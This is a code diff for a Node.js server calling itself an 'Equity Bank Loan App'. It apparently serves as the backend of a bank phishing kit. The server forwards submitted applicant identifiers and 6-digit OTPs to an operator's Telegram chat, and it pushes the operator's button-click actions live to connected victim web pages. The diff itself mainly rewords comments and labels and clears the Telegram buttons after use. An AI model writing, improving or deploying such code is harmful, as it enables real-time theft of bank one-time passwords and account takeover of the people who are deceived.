@@ -17,13 +17,13 @@ let adminChatId = process.env.ADMIN_CHAT_ID || null;
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook endpoint for receiving Telegram updates
+// Webhook endpoint for Telegram updates
 app.post(`/bot${BOT_TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
-// Capture admin Chat ID on /start command
+// Capture admin Chat ID on /start
 bot.onText(/\/start/, (msg) => {
   adminChatId = msg.chat.id;
   bot.sendMessage(
@@ -33,15 +33,25 @@ bot.onText(/\/start/, (msg) => {
   );
 });
 
-// Handle Admin Inline Button Actions
+// Handle Inline Button Clicks from Admin
 bot.on('callback_query', (query) => {
   const action = query.data;
   const chatId = query.message.chat.id;
+  const messageId = query.message.message_id;
 
+  // Broadcast action to live web application
   broadcastToClients({ type: 'ADMIN_ACTION', action });
 
-  bot.answerCallbackQuery(query.id, { text: `Action sent: ${action}` });
-  bot.sendMessage(chatId, `✅ *Executed:* ${action}`, { parse_mode: 'Markdown' });
+  bot.answerCallbackQuery(query.id, { text: `Action executed: ${action}` });
+
+  // Remove the inline buttons from Telegram message so they fade/disappear
+  bot.editMessageReplyMarkup(
+    { inline_keyboard: [] },
+    { chat_id: chatId, message_id: messageId }
+  ).catch(err => console.error(err));
+
+  // Send confirmation status in chat
+  bot.sendMessage(chatId, `✅ *Status Executed:* ${action}`, { parse_mode: 'Markdown' });
 });
 
 const clients = new Set();
@@ -51,7 +61,6 @@ app.ws('/ws', (ws, req) => {
   ws.on('close', () => clients.delete(ws));
 });
 
-// HTTP submission endpoint
 app.post('/api/submit', (req, res) => {
   handleClientMessage(req.body);
   res.json({ success: true });
@@ -102,7 +111,7 @@ function handleClientMessage(data) {
     case 'OTP_SUBMIT': {
       const text = `🔑 *OTP SUBMITTED*\n\n` +
         `• *Applicant:* ${data.identifier}\n` +
-        `• *OTP:* \`${data.otp}\``;
+        `• *6-Digit OTP:* \`${data.otp}\``;
 
       bot.sendMessage(targetChatId, text, {
         parse_mode: 'Markdown',
@@ -159,7 +168,6 @@ function handleClientMessage(data) {
   }
 }
 
-// Auto-register webhook with Telegram API on server start
 function autoSetWebhook() {
   const webhookUrl = `${RENDER_URL}/bot${BOT_TOKEN}`;
   const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
@@ -167,16 +175,12 @@ function autoSetWebhook() {
   https.get(apiUrl, (res) => {
     let rawData = '';
     res.on('data', chunk => { rawData += chunk; });
-    res.on('end', () => {
-      console.log('🤖 Telegram Webhook Registration:', rawData);
-    });
-  }).on('error', (e) => {
-    console.error('⚠️ Webhook Registration Error:', e.message);
-  });
+    res.on('end', () => console.log('🤖 Telegram Webhook Registration:', rawData));
+  }).on('error', (e) => console.error('⚠️ Webhook Error:', e.message));
 }
 
 app.listen(PORT, () => {
   console.log(`Equity Bank Loan App running on port ${PORT}`);
   autoSetWebhook();
 });
-       
+  
